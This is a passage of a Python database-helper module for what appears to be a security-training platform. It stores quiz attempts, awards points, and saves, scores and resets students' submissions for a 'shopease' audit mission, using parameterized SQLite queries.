        SET answers_json = ?, current_index = ?, is_completed = ?, updated_at = CURRENT_TIMESTAMP
        WHERE session_id = ? AND user_id = ?
    """, (json.dumps(answers), next_index, is_completed, session_id, user_id))
    conn.commit()
    conn.close()
    return True


def delete_active_session(session_id, user_id):
    """Cleans up active session upon quiz completion or restart."""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM knowledge_active_sessions WHERE session_id = ? AND user_id = ?", (session_id, user_id))
    conn.commit()
    conn.close()


def save_knowledge_attempt(user_id, module_id, difficulty, score, total_questions, answers_list):
    """
    Saves a completed quiz attempt, updates user's knowledge_progress,
    and awards Defense Score points to the user.
    """
    percentage = round((score / total_questions) * 100, 1) if total_questions > 0 else 0.0
    passed = 1 if score >= 12 else 0  # 60% passing mark (12/20)

    conn = get_db_connection()
    cursor = conn.cursor()

    # 1. Insert attempt
    cursor.execute("""
        INSERT INTO knowledge_attempts (user_id, module_id, difficulty, score, total_questions, percentage, answers_json)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (user_id, module_id, difficulty, score, total_questions, percentage, json.dumps(answers_list)))
    attempt_id = cursor.lastrowid

    # 2. Upsert progress
    cursor.execute("""
        INSERT INTO knowledge_progress (user_id, module_id, difficulty, best_score, total_questions, attempts_count, completed, last_completed_at)
        VALUES (?, ?, ?, ?, ?, 1, ?, CURRENT_TIMESTAMP)
        ON CONFLICT(user_id, module_id, difficulty) DO UPDATE SET
            best_score = MAX(knowledge_progress.best_score, excluded.best_score),
            attempts_count = knowledge_progress.attempts_count + 1,
            completed = MAX(knowledge_progress.completed, excluded.completed),
            last_completed_at = CURRENT_TIMESTAMP
    """, (user_id, module_id, difficulty, score, total_questions, passed))

    # 3. Award defense points (e.g. 5 points per correct answer)
    points_awarded = score * 5
    if points_awarded > 0:
        cursor.execute("""
            UPDATE users
            SET defense_score = defense_score + ?
            WHERE id = ?
        """, (points_awarded, user_id))

    conn.commit()
    conn.close()

    # Log audit event
    log_audit_event(
        user_id=user_id,
        action="KNOWLEDGE_CHECK_COMPLETED",
        details=f"Module {module_id} ({difficulty}): {score}/{total_questions} ({percentage}%) - +{points_awarded} pts"
    )

    return attempt_id


def get_knowledge_attempt(attempt_id, user_id):
    """Fetches a specific attempt for historical review."""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        SELECT id, user_id, module_id, difficulty, score, total_questions, percentage, answers_json, created_at
        FROM knowledge_attempts
        WHERE id = ? AND user_id = ?
    """, (attempt_id, user_id))
    row = cursor.fetchone()
    conn.close()

    if not row:
        return None

    return {
        "id": row["id"],
        "user_id": row["user_id"],
        "module_id": row["module_id"],
        "difficulty": row["difficulty"],
        "score": row["score"],
        "total_questions": row["total_questions"],
        "percentage": row["percentage"],
        "answers": json.loads(row["answers_json"]) if row["answers_json"] else [],
        "created_at": row["created_at"]
    }


def get_user_knowledge_attempts(user_id, limit=20):
    """Returns recent attempts for user."""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        SELECT id, module_id, difficulty, score, total_questions, percentage, created_at
        FROM knowledge_attempts
        WHERE user_id = ?
        ORDER BY created_at DESC
        LIMIT ?
    """, (user_id, limit))
    rows = cursor.fetchall()
    conn.close()

    return [
        {
            "id": r["id"],
            "module_id": r["module_id"],
            "difficulty": r["difficulty"],
            "score": r["score"],
            "total_questions": r["total_questions"],
            "percentage": r["percentage"],
            "created_at": r["created_at"]
        } for r in rows
    ]


# ==============================================================================
# 11. Security Audit Lab: Database Helpers
# ==============================================================================

def save_audit_submission(user_id, mission_id, stage_id, submission_data, evaluation_result):
    """Saves or updates a student's audit submission for a specific mission and stage."""
    conn = get_db_connection()
    cursor = conn.cursor()

    weakness_answer = submission_data.get("weakness", "")
    evidence_answer = submission_data.get("evidence", "")
    risk_level = submission_data.get("risk", "High")
    impact_answer = submission_data.get("impact", "")
    recommendation_answer = submission_data.get("recommendation", "")

    crit = evaluation_result.get("criteria_scores", {})
    weakness_score = crit.get("weakness", {}).get("score", 0)
    evidence_score = crit.get("evidence", {}).get("score", 0)
    risk_score = crit.get("risk", {}).get("score", 0)
    impact_score = crit.get("impact", {}).get("score", 0)
    recommendation_score = crit.get("recommendation", {}).get("score", 0)
    total_score = evaluation_result.get("total_score", 0)
    feedback_json = json.dumps(evaluation_result)

    cursor.execute("""
        INSERT INTO audit_submissions (
            user_id, mission_id, stage_id, weakness_answer, evidence_answer,
            risk_level, impact_answer, recommendation_answer,
            weakness_score, evidence_score, risk_score, impact_score, recommendation_score,
            total_score, feedback_json, updated_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        ON CONFLICT(user_id, mission_id, stage_id) DO UPDATE SET
            weakness_answer = excluded.weakness_answer,
            evidence_answer = excluded.evidence_answer,
            risk_level = excluded.risk_level,
            impact_answer = excluded.impact_answer,
            recommendation_answer = excluded.recommendation_answer,
            weakness_score = excluded.weakness_score,
            evidence_score = excluded.evidence_score,
            risk_score = excluded.risk_score,
            impact_score = excluded.impact_score,
            recommendation_score = excluded.recommendation_score,
            total_score = excluded.total_score,
            feedback_json = excluded.feedback_json,
            updated_at = CURRENT_TIMESTAMP
    """, (
        user_id, mission_id, stage_id, weakness_answer, evidence_answer,
        risk_level, impact_answer, recommendation_answer,
        weakness_score, evidence_score, risk_score, impact_score, recommendation_score,
        total_score, feedback_json
    ))

    # Calculate overall mission progress stats
    cursor.execute("""
        SELECT COUNT(*), SUM(total_score), AVG(total_score)
        FROM audit_submissions
        WHERE user_id = ? AND mission_id = ?
    """, (user_id, mission_id))
    stats = cursor.fetchone()
    completed_count = stats[0] or 0
    total_pts = stats[1] or 0
    avg_pts = round(stats[2] or 0.0, 1)

    next_stage = min(4, stage_id + 1)
    is_completed = 1 if completed_count >= 4 else 0

    cursor.execute("""
        INSERT INTO audit_progress (
            user_id, mission_id, current_stage, completed_stages, is_completed,
            average_score, total_score, updated_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        ON CONFLICT(user_id, mission_id) DO UPDATE SET
            completed_stages = excluded.completed_stages,
            is_completed = excluded.is_completed,
            average_score = excluded.average_score,
            total_score = excluded.total_score,
            updated_at = CURRENT_TIMESTAMP
    """, (user_id, mission_id, next_stage, completed_count, is_completed, avg_pts, total_pts))

    conn.commit()
    conn.close()

    log_audit_event(
        user_id=user_id,
        action="AUDIT_STAGE_SUBMITTED",
        details=f"Mission: {mission_id}, Stage: {stage_id}, Score: {total_score}/100"
    )


def get_audit_submission(user_id, mission_id, stage_id):
    """Retrieves a user's submission and evaluation for a stage."""
    conn = get_db_connection()
    row = conn.execute("""
        SELECT * FROM audit_submissions
        WHERE user_id = ? AND mission_id = ? AND stage_id = ?
    """, (user_id, mission_id, stage_id)).fetchone()
    conn.close()

    if not row:
        return None

    return {
        "id": row["id"],
        "user_id": row["user_id"],
        "mission_id": row["mission_id"],
        "stage_id": row["stage_id"],
        "weakness_answer": row["weakness_answer"],
        "evidence_answer": row["evidence_answer"],
        "risk_level": row["risk_level"],
        "impact_answer": row["impact_answer"],
        "recommendation_answer": row["recommendation_answer"],
        "weakness_score": row["weakness_score"],
        "evidence_score": row["evidence_score"],
        "risk_score": row["risk_score"],
        "impact_score": row["impact_score"],
        "recommendation_score": row["recommendation_score"],
        "total_score": row["total_score"],
        "feedback_data": json.loads(row["feedback_json"]) if row["feedback_json"] else {},
        "created_at": row["created_at"],
        "updated_at": row["updated_at"]
    }


def get_user_audit_submissions(user_id, mission_id="shopease"):
    """Fetches all stage submissions for a user on a given mission, ordered by stage_id."""
    conn = get_db_connection()
    rows = conn.execute("""
        SELECT * FROM audit_submissions
        WHERE user_id = ? AND mission_id = ?
        ORDER BY stage_id ASC
    """, (user_id, mission_id)).fetchall()
    conn.close()

    results = []
    for row in rows:
        results.append({
            "id": row["id"],
            "user_id": row["user_id"],
            "mission_id": row["mission_id"],
            "stage_id": row["stage_id"],
            "weakness_answer": row["weakness_answer"],
            "evidence_answer": row["evidence_answer"],
            "risk_level": row["risk_level"],
            "impact_answer": row["impact_answer"],
            "recommendation_answer": row["recommendation_answer"],
            "weakness_score": row["weakness_score"],
            "evidence_score": row["evidence_score"],
            "risk_score": row["risk_score"],
            "impact_score": row["impact_score"],
            "recommendation_score": row["recommendation_score"],
            "total_score": row["total_score"],
            "feedback_data": json.loads(row["feedback_json"]) if row["feedback_json"] else {},
            "created_at": row["created_at"],
            "updated_at": row["updated_at"]
        })
    return results


def get_or_create_audit_progress(user_id, mission_id="shopease"):
    """Gets or initializes progress record for a mission."""
    conn = get_db_connection()
    cursor = conn.cursor()
    row = cursor.execute("""
        SELECT * FROM audit_progress
        WHERE user_id = ? AND mission_id = ?
    """, (user_id, mission_id)).fetchone()

    if not row:
        cursor.execute("""
            INSERT INTO audit_progress (user_id, mission_id, current_stage, completed_stages, is_completed, average_score, total_score)
            VALUES (?, ?, 1, 0, 0, 0.0, 0)
        """, (user_id, mission_id))
        conn.commit()
        row = cursor.execute("""
            SELECT * FROM audit_progress
            WHERE user_id = ? AND mission_id = ?
        """, (user_id, mission_id)).fetchone()

    conn.close()
    return {
        "id": row["id"],
        "user_id": row["user_id"],
        "mission_id": row["mission_id"],
        "current_stage": row["current_stage"],
        "completed_stages": row["completed_stages"],
        "is_completed": row["is_completed"],
        "average_score": row["average_score"],
        "total_score": row["total_score"],
        "final_report": json.loads(row["final_report_json"]) if row["final_report_json"] else None,
        "updated_at": row["updated_at"]
    }


def update_audit_progress_report(user_id, mission_id, report_data):
    """Saves final report JSON and marks mission complete."""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        UPDATE audit_progress
        SET is_completed = 1,
            final_report_json = ?,
            average_score = ?,
            total_score = ?,
            updated_at = CURRENT_TIMESTAMP
        WHERE user_id = ? AND mission_id = ?
    """, (
        json.dumps(report_data),
        report_data.get("average_score", 0.0),
        report_data.get("total_earned", 0),
        user_id,
        mission_id
    ))
    conn.commit()
    conn.close()


def reset_audit_mission(user_id, mission_id="shopease"):
    """Resets user progress and submissions for re-taking the mission."""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM audit_submissions WHERE user_id = ? AND mission_id = ?", (user_id, mission_id))
    cursor.execute("""
        UPDATE audit_progress
        SET current_stage = 1,
            completed_stages = 0,
            is_completed = 0,
            average_score = 0.0,
            total_score = 0,
            final_report_json = NULL,
            updated_at = CURRENT_TIMESTAMP
        WHERE user_id = ? AND mission_id = ?
    """, (user_id, mission_id))
    conn.commit()
    conn.close()
    log_audit_event(user_id, "AUDIT_MISSION_RESET", f"Reset mission: {mission_id}")


if __name__ == "__main__":
    init_db()
